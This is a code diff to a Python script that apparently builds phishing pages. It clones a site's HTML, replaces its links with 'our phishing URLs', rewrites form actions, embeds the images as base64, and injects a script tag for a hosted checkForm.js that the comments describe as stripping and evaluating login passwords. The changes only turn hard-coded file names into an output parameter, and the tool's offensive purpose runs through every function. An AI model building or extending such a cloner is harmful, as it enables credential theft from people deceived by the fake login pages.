@@ -4,16 +4,16 @@ import urlparse #For joining URLs for <img> tags
 import base64 #For encoding and embedding images
 import urllib #For opening image URLs
 
-#This is Step 1 - URLs are replaced with our phishing URLs and new text is saved to source.html
-def replaceURL(strURL):
+#This is Step 1 - URLs are replaced with our phishing URLs and new text is saved to output file
+def replaceURL(strURL,OUTPUT):
 	#Provide user feedback
 	print "[+] Replacing URLs..."
 	print "[+] URLs that will be replaced:"
 	#Open source, read lines, and begin parsing to replace all URLs for scripts and links
 	try:
 		#Print href URLs that will be replaced
-		print "\n".join(re.findall('<a href="?\'?([^"\'>]*)', open('source.html').read()))
-		with open('source.html', "r") as html:
+		print "\n".join(re.findall('<a href="?\'?([^"\'>]*)', open(OUTPUT).read()))
+		with open(OUTPUT, "r") as html:
 			#Read in the source html and parse with BeautifulSoup
 			soup = BeautifulSoup(html)
 			#Find all links and replace URLs with our new text/URLs
@@ -24,8 +24,8 @@ def replaceURL(strURL):
 			for link in soup.findAll('script', src=True):
 				link['src'] = urlparse.urljoin(strURL, link['src'])
 			source = str(soup.prettify(encoding='utf-8'))
-			#Write the updated URLs to source.html while removing the [' and ']
-			output = open("index.html", "w")
+			#Write the updated URLs to output file while removing the [' and ']
+			output = open(OUTPUT, "w")
 			output.write(source.replace('[','').replace(']',''))
 			output.close()
 			print "[+] URL parsing successful. URLs replaced."
@@ -33,18 +33,18 @@ def replaceURL(strURL):
 		print "[-] URL parsing failed. Make sure the html file exists and is readable."
 
 #This is step 2 - Insert JavaScript for login form password dtripping and evaluation.
-def insertPwdEval():
-	strJSLogin = '<script type="text/javascript" src="JAVASCRIPT_LINK"></script>'
+def insertPwdEval(OUTPUT):
+	strJSLogin = '<script type="text/javascript" src="JAVASCRIPT_LINK"></script>' #Replace src with real URL for hosted checkForm.js
 	print "[+] Inserting password JavaScript."
 	try:
-		with open('source.html', "r") as html:
+		with open(OUTPUT, "r") as html:
 			#Read in the source html and parse with BeautifulSoup
 			source = html.read()
 			index = source.find(r"</html")
 			print "[+] Closing HTML tag found at index " + str(index)
 			javascript = source[:index] + strJSLogin + source[index:]
 			soup = BeautifulSoup(javascript.replace('[','').replace(']',''))
-			output = open("source.html", "w")
+			output = open(OUTPUT, "w")
 			output.write(soup.prettify(encoding='utf-8'))
 			output.close()
 			print "[+] JavaScript has been inserted."
@@ -52,13 +52,13 @@ def insertPwdEval():
 		#Exception may occur if file doesn't exist or can't be read/written to
 		print "[-] Failed to insert JavaScript. Make sure the html file exists and is readable."
 
-def fixForms():
+def fixForms(OUTPUT):
 	#Provide user feedback
 	print "[+] Finding forms to edit."
 	print "[+] RegEx matches:"
-	#Open source.html, read lines, and begin parsing to replace all incomplete img src URLs
+	#Open output file, read lines, and begin parsing to replace all incomplete img src URLs
 	try:
-		with open('source.html', "r") as html:
+		with open(OUTPUT, "r") as html:
 			#Read in the source html and parse with BeautifulSoup
 			soup = BeautifulSoup(html)
 			#Find all <form> with action attribute and replace it
@@ -67,8 +67,8 @@ def fixForms():
 				#form['method'] = "post"
 				#form['onsubmit'] = "return checkForm(this);"
 			source = str(soup.prettify(encoding='utf-8'))
-			#Write the updated form to source.html while removing the [' and ']
-			output = open("index.html", "w")
+			#Write the updated form to output file while removing the [' and ']
+			output = open(OUTPUT, "w")
 			output.write(source.replace('[','').replace(']',''))
 			output.close()
 			print "[+] Form parsing successful."
@@ -76,17 +76,17 @@ def fixForms():
 		#Exception may occur if file doesn't exist or can't be read/written to
 		print "[-] Form parsing failed. Make sure the html file exists and is readable."
 
-#This is Step 3 - Images are found, downloaded, encoded in Base64, and embedded in index.html
-def fixImageURL(strURL):
+#This is Step 3 - Images are found, downloaded, encoded in Base64, and embedded in the output file
+def fixImageURL(strURL,OUTPUT):
 	#Provide user feedback
 	print "[+] Finding IMG tags with src=/... for replacement."
 	print "[+] RegEx matches:"
 	#Open source, read lines, and begin parsing to replace all incomplete img src URLs
 	try:
 		#Print img src URLs that will be modified and provide info
-		print "\n".join(re.findall('src="(.*?)"', open('source.html').read()))
+		print "\n".join(re.findall('src="(.*?)"', open(OUTPUT).read()))
 		print "[+] Fixing src with " + strURL + "..."
-		with open('index.html', "r") as html:
+		with open(OUTPUT, "r") as html:
 			#Read in the source html and parse with BeautifulSoup
 			soup = BeautifulSoup(html)
 			#Find all <img> with src attribute and create a full URL to download and embed image(s)
@@ -97,8 +97,8 @@ def fixImageURL(strURL):
 				img_64 = base64.b64encode(image.read())
 				img['src'] = "data:image/png;base64," + img_64
 			source = str(soup.prettify(encoding='utf-8'))
-			#Write the updated addresses to source.html while removing the [' and ']
-			output = open("index.html", "w")
+			#Write the updated addresses to output file while removing the [' and ']
+			output = open(OUTPUT, "w")
 			output.write(source.replace('[','').replace(']',''))
 			output.close()
 			print "[+] IMG parsing successful. IMG src's fixed."
